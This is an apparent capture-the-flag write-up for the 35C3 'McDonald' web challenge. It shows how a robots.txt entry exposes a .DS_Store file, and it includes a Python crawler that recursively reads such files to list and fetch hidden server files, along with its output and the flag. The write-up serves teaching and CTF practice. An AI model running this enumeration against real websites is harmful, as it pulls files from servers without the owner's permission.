# McDonald
Web

## Description:
> Our web admin name's "Mc Donald" and he likes apples and always forgets to throw away his apple cores..

## Solution:

The website seems pretty empty, nothing much there.

Let's check for `robots.txt`:
```console
root@kali:/media/sf_CTFs/35c3ctf/McDonald# curl -s http://35.207.132.47:85/robots.txt
User-agent: *
Disallow: /backup/.DS_Store
```

What is this file (Source: [Wikipedia](https://en.wikipedia.org/wiki/.DS_Store))?
> In the Apple macOS operating system, .DS_Store is a file that stores custom attributes of its containing folder, such as the position of icons or the choice of a background image. The name is an abbreviation of Desktop Services Store, reflecting its purpose. It is created and maintained by the Finder application in every folder, and has functions similar to the file desktop.ini in Microsoft Windows. Starting with a full stop (period) character, it is hidden in Finder and many Unix utilities. Its internal structure is proprietary.

The format is proprietary but luckily someone published a [script](https://github.com/gehaxelt/Python-dsstore) to parse the file (and not just anyone - the challenge author!).

Here's the output for our file:
```
root@kali:/media/sf_CTFs/35c3ctf/McDonald/manual# python ~/utils/Python-dsstore/main.py .DS_Store
('Count: ', 20)
a
a
a
a
b
b
b
b
b
b
b
b
c
c
c
c
c
c
c
c
```

It looks like these are also folders, and that some of them contain a `.DS_Store` file as well.

Using this script, we can traverse the directory structure:
```python
import requests
import sys
import dsstore

BASE_URL = "http://35.207.91.38/"
BASE_FOLDER = "out"
DS_FILENAME = ".DS_Store"

def get_file_content(relative_address):
    r = requests.get(BASE_URL + relative_address)
    if r.status_code == 200:
        return r.content
    return None

def get_files_and_folders(ds_store_content):
    d = dsstore.DS_Store(ds_store_content, debug=False)
    files = d.traverse_root()
    return set(files)

queue = ["backup"]

while (len(queue) != 0):
    item = queue.pop()
    print "Parsing: {}".format(item)
    f = get_file_content(item + "/" + DS_FILENAME)
    if f is not None:
        files = get_files_and_folders(f)
        print files
        for file in files:
            new_path = item + "/" + file
            if "." not in file:
                queue.append(new_path)
            else:
                print "Content of {}:".format(new_path)
                print get_file_content(new_path)
```

The output:
```
root@kali:/media/sf_CTFs/35c3ctf/McDonald# python solve.py
Parsing: backup
set([u'a', u'c', u'b'])
Parsing: backup/b
set([u'a', u'c', u'b', u'noflag.txt'])
Content of backup/b/noflag.txt:

Parsing: backup/b/b
set([u'fun'])
Parsing: backup/b/b/fun
Parsing: backup/b/c
Parsing: backup/b/a
set([u'a', u'c', u'b', u'noflag.txt'])
Content of backup/b/a/noflag.txt:

Parsing: backup/b/a/b
set([u'fun'])
Parsing: backup/b/a/b/fun
Parsing: backup/b/a/c
set([u'flag.txt', u'noflag.txt'])
Content of backup/b/a/c/flag.txt:
35c3_Appl3s_H1dden_F1l3s

Content of backup/b/a/c/noflag.txt:

Parsing: backup/b/a/a
Parsing: backup/c
set([u'a', u'c', u'b'])
Parsing: backup/c/b
set([u'a', u'c', u'b'])
Parsing: backup/c/b/b
Parsing: backup/c/b/c
Parsing: backup/c/b/a
Parsing: backup/c/c
set([u'a', u'c', u'b'])
Parsing: backup/c/c/b
Parsing: backup/c/c/c
Parsing: backup/c/c/a
Parsing: backup/c/a
Parsing: backup/a
```

The flag is hiding in `backup/b/a/c/flag.txt`: 35c3_Appl3s_H1dden_F1l3s